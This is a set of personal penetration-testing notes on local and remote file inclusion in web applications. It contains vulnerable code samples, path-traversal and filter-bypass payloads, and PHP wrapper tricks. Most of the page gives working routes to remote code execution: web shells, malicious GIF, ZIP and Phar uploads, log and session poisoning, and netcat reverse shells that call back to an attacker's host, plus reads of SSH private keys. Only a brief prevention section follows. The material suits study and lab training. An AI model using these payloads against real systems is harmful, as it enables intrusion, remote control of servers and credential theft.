---
title: Notes | LFI
author: Zeropio
date: 2022-04-23
categories: [Notes, Vulnerabilities]
tags: [lfi]
permalink: /notes/vulnerabilities/lfi
---


# Local file inclusion
**LFI** is the process to include files locate in the server through the exploiting of vulnerable inclusion. The most common place we usually find LFI within is templating engines, for example `/index.php?page=about`. Where `index.php` sets static content and the parameter `page` dinamically. LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions.

Some examples of insecure code:
- PHP 

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- NodeJS 

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- Express.js 

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

- Java 

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

- .NET 

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Read vs Execute

There are a difference in these functions between read and execute. Some of the above functions **only read** the content of the specified files, while others also **execute** the specified files:

| **Function**    | **Read content**   | **Execute**    | **Remote URL** |
|---------------- | --------------- | --------------- | -------------- |
| **PHP** |     
| `include()`/`include_once()` | ✅| ✅| ✅| 
| `require()`/`require_once()` | ✅| ✅ | ⬜️|
| `file_get_contents()` | ✅ | ⬜️ | ✅ |
| `fopen()`/`file()` | ✅ | ⬜️ | ⬜️ |
| **NodeJS** |			
| `fs.readFile()` |	✅ |	⬜️ |	⬜️ |
| `fs.sendFile()` |	✅ |	⬜️ | 	⬜️ |
| `res.render()` | 	✅ | 	✅ |	⬜️ |
| **Java** |			
| `include` |	✅ |	⬜️ | 	⬜️ |
| `import` |	✅ |	✅ |	✅ |
| **.NET** |			
| `@Html.Partial()` |	✅ | 	⬜️ | 	⬜️ |
| `@Html.RemotePartial()` |	✅ | 	⬜️ |	✅ |
| `Response.WriteFile()` |	✅ |	⬜️ |	⬜️ |
| `include` |	✅ |	✅ |	✅ |

---

# File Disclosure

## Basic LFI

Taking the last example, a page that allow to change language can be seen as: `http://<ip>/index.php?language=es.php`

We can try a direct LFI to see other files.
```
http://<ip>/index.php?language=/etc/passwd
``` 

## Path Traversal 

The example was using an **absolute path**, this could work with a code like:
```php
include($_GET['language']);
```

But if the code has some type of restriction as:
```php
include("./languages/" . $_GET['language']);
```

In this case, the path will be `./languages//etc/passwd`, leading to an error. So we need to try with **relative path**. In Windows and Linux `..` means one folder back. We can try with: 
```
http://<ip>/index.php?language=../../../etc/passwd
```

## Filename Prefix 

If the code simply add the prefix:
```php
include("lang_" . $_GET['language']);
```

Our last example will be `lang_../../../etc/passwd`. We need to break it: 
```
http://<ip>/index.php?language=/../../../etc/passwd
```

The final output will be `lang_/../../../etc/passwd`

> Maybe `lang_/` don't exist and the page break instead of showing the file.
{: .prompt-warning }

a


## Second-Order Attacks 

In some cases, we can use variables inside the web to provoke a LFI. It is called *Secon-Order* because we infect a service (for example a database), and other (like the web) perform the attack.

For example, if our profile picture is from `/profile/$username/avatar.png`{: .filepath}, we can change our username to `../../../etc/passwd`.

## Basic Bypasses

### Non-Recursive Path Traversal Filters 

One common filter is to replace some strings (like `../`):
```php
$language = str_replace('../', '', $_GET['language']);
```

It is easily broken:
```
http://<ip>/index.php?language=....//....//....//....//etc/passwd
```

There are more types, for example `..././`, `....\/`, `....////`,...

### Encoding 

One basic bypass is to encode it. The string `../` in ASCII is `%2e%2e%2f`. We can encode all the string, or maybe only a part:
```
http://<ip>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Also, we can double encode it.

### Approved Paths 

Some webs uses **regular expressions** to ensure that we are in their path:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

We will need to get the approved path, via fuzzing, checking the request or trial-error. Once we get it:
```
http://<ip>/index.php?language=./languages/../../../../etc/passwd
```

### Appended Extensions 

In some cases, the extension can be added to our input:
```php
include($_GET['language'] . ".php");
```

So our input will be `/etc/passwd.php`. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension.

#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. First we need to start with a non-existing path. 

With a bash script we can easily reach 4096 characters:
```console
zero@pio$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

And then copy and paste in the url.
```
http://<ip>/index.php?language=non_existing_directory/../../../etc/passwd/././...
```

We need to calculate where it will truncate, to remove only `.php` and not the rest of our string.

#### Null Bytes 

PHP versions before 5.5 were vulnerable to **null byte injection**, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.

As simple as using `/etc/passwd%00`, the final string would be `/etc/passwd%00.php`. Anything after the null byte will be truncated.

## PHP Filters 

[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) are a useful tool to test more options.

### Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are one of the PHP wrappers types. To use a wrapper we need to type `php://`, and the filters `php://filter/`.
We will use to parameter: **resource** and **read**. There are four types for filter:
- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)

### Fuzzing for PHP Files

We will start fuzzing:
```console
zero@pio$ ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>/FUZZ.php
```

### Source Code Disclosure 

Once we have a list of php files, we can start trying to read it. Let's take a `config.php` file:
```
php://filter/read=convert.base64-encode/resource=config
```
```
http://<ip>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

> Maybe we need to add `.php` at the end of the file name or not. It's depend on the web.
{: .prompt-tip}

This will reply with a encode string. Decode it to get the file:
```console
zero@pio$ echo '[string]' | base64 -d
```

---

# Remote Code Execution

## PHP Wrappers

### Data 

The data wrapper can be used to include external data, including PHP code. It's need to have `grep allow_url_include` enable. Let's check it.

First, find the PHP config file (`/etc/php/X.Y/apache2/php.ini`{: .filepath} for Apache, `/etc/php/X.Y/fpm/php.ini`{: .filepath} for Nginx).
```console
zero@pio$ curl "http://<ip/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
zero@pio$ echo "[string]" | base64 -d | grep allow_url_include

allow_url_include = On
```

First, create a basic PHP reverse shell:
```console
zero@pio$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can inject it in the url. Encode the base64 string and pass it:
```
http://<ip>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
We need to end with `&cmd=<COMMAND>`.

> We can use curl also.
{: .prompt-tip}

### Input

Similar to *data*, but we send the code with POST. Also depends on `allow_url_include`.

```console
zero@pio$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<ip>/index.php?language=php://input&cmd=id" | grep uid
```

> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). 
{: .prompt-info}

### Expect

The expect wrapper allows us to run commands in the URL. However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. To check if it is enable:
```console
zero@pio$ echo '[string]' | base64 -d | grep expect

extension=expect
```

The usage is the following:
```console
zero@pio$ curl -s "http://<ip>/index.php?language=expect://id"
```

## Remote File Inclusion 

If the vulnerable function allows the inclusion of remote URLs, we have an **RFI**. Almost all the RFI is a LFI, but not all the LFI are RFI. Mainly because:
- The vulnerable function may not allow including remote URLs
- You may only control a portion of the filename and not the entire protocol wrapper 
- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default 

To verify if it is vulnerable to RFI we can check the property `allow_url_include`:
```console
zero@pio$ echo '[string]' | base64 -d | grep allow_url_include

allow_url_include = On
```

Even though, the code could not allow remote URL. It is recommendable to first check LFI:
```
http://<ip>/index.php?language=http://127.0.0.1:80/index.php
```

### RCE with RFI 

First, create a script in the page langauge:
```console
zero@pio$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Create a web server:
```console
zero@pio$ sudo python3 -m http.server <port>
```

And execute it:
```
http://<ip>/index.php?language=http://<your ip>:<your port>/shell.php&cmd=id
```

### SMB 

If the server is a Windows, we don't need `allow_url_include` to be allowed, as we can use the SMB protocol. First, start a server with **Impacket**:
```console
zero@pio$ impacket-smbserver -smb2support share $(pwd)
```

And then:
```
http://<ip>/index.php?language=\\<your ip>\shell.php&cmd=whoami
```

## File Uploads 

### GIF 

Start creating a malicious image:
```console
zero@pio$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

> We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters
{: .prompt-tip}

Now we upload the image and get the path, the HTML code can have it (also we can fuzz):
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

And execute it:
```
http://<ip>/index.php?language=./profile_images/shell.gif&cmd=id
```

### ZIP

Let's start with an image called `shell.jpg`.
```console
zero@pio$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Now, use the **zip** wrapper:
```
http://<ip>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id 
```

### Phar 

We can achieve the same with the **phar** wrapper. Let's create the shell as the following:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Let's compiled into a phar file rename it:
```console
zero@pio$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

We will use a subfile called `shell.txt` to interact with:
```
http://<ip>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log Poisoning

### PHP Session Poisoning

Most PHP web applications utilize **PHPSESSID** cookies, which are stored in `/var/lib/php/sessions/`{: .filepath} with the prefix `sess_`. For example, for the cookie `PHPSESSID=el4ukv0kqbvoirg7nkp4dncpk3`, the file would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`{: .filepath}.

First, start searching for a paremeter of the cookie that we can control. For example, using the previous page the `language` parameter.
```
http://<ip>/index.php?language=test
```

Accesing now the path we will see that text. Let's add a web shell and access the cookie.
```
http://<ip>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
```
http://<ip>/index.php?language=/var/lib/php/sessions/sess_<cookie>&cmd=id
```

### Server Log Poisoning

Both Apache and Nginx maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's **User-Agent** header. After poisoning the log we need to access it, these are the different folders for each web server:

| **Server**   | **Path Linux**   | **Path Windows** |
|--------------- | --------------- | ---------- |
| Apache  | `/var/log/apache2/`{: .filepah}  | `C:\xampp\apache\logs\`{: .filepath} |
| Nginx | `/var/log/nginx/`{: .filepath} | `C:\nginx\log\`{: .filepath} |

In **Burp Suite** we can change the **User-Agent**, or with cURL:
```console
zero@pio$ curl -s "http://<ip>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

Now...
```
http://<ip>/index.php?language=/var/log/apache2/access.log&cmd=id
```

Another example is the **/var/log/auth.log**. We can try to log in by ssh with and invalid user and see that all the trys are been saving in the log.
If we log as a command, execute the log (loading with curl or in the web with LFI) we can execute the command and get a **reverse shell**:
- First we encode the connection (with netcat).
```console
> echo 'nc -e /bin/bash 127.0.0.1:443' | base64; echo
  bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK
```
- Then we send this "user" to the log:
```console
> ssh '<¿php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK | base64 -d | bash"); ?>'@127.0.0.1 
```
Then we will try to log in with any password. Now we just need to reload the log in the web, then the code is executed.
```console
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/auth.log"
```

---

# Prevention

- **File Inclusion Prevention**: avoid passing any user-controlled inputs into any file inclusion functions or APIs 
- **Preventing Directory Traversal**: use your programming language's (or framework's) built-in tool to pull only the filename (in PHP the function `basename()`) or sanitize the input 

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

- **Web Server Configuration**: set `allow_url_fopen` and `allow_url_include` Off
- **Web Application Firewall (WAF)**: using some, like *ModSecurity*

---

# Other

## Reverse Shell
We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
```php
<?passthru('nc -e /bin/bash <ip> <port>');?>
```
To execute the reverse shell.

## Important things to check 

We can check some important files:
- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
- **/proc/sched_debug ->**  show many running scripts
- **/proc/net/fib_trie ->** check network interfaces (with `grep -i  "host local" -B 1` we can get local ip).
- **/proc/net/tcp ->** check port. The last four digits from the second column (rem\_address), if we add a **0x** in Python before we can get the port (its common to not get the port 80).

